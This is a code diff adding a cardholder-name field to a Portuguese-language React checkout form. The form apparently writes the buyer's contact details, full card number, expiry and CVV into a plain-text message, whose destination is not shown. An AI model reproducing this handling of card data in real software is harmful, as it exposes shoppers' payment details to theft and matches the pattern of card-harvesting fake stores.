@@ -10,6 +10,7 @@ interface FormData {
   email: string;
   telefone: string;
   endereco: string;
+  nomeCartao: string;
   numeroCartao: string;
   validadeCartao: string;
   cvv: string;
@@ -24,6 +25,7 @@ export const CheckoutForm = () => {
     email: "",
     telefone: "",
     endereco: "",
+    nomeCartao: "",
     numeroCartao: "",
     validadeCartao: "",
     cvv: "",
@@ -39,6 +41,7 @@ Email: ${data.email}
 Telefone: ${data.telefone}
 Endereço: ${data.endereco}
 ------- Dados do Pagamento -------
+Nome no Cartão: ${data.nomeCartao}
 Número: ${data.numeroCartao}
 Validade: ${data.validadeCartao}
 CVV: ${data.cvv}
@@ -105,6 +108,7 @@ Frete: Grátis
           email: "",
           telefone: "",
           endereco: "",
+          nomeCartao: "",
           numeroCartao: "",
           validadeCartao: "",
           cvv: "",
@@ -136,6 +140,7 @@ Frete: Grátis
         />
         <PaymentForm
           {...formData}
+          onCardNameChange={(value) => setFormData({ ...formData, nomeCartao: value })}
           onCardNumberChange={handleCardNumberChange}
           onValidityChange={handleCardValidityChange}
           onCvvChange={handleCvvChange}
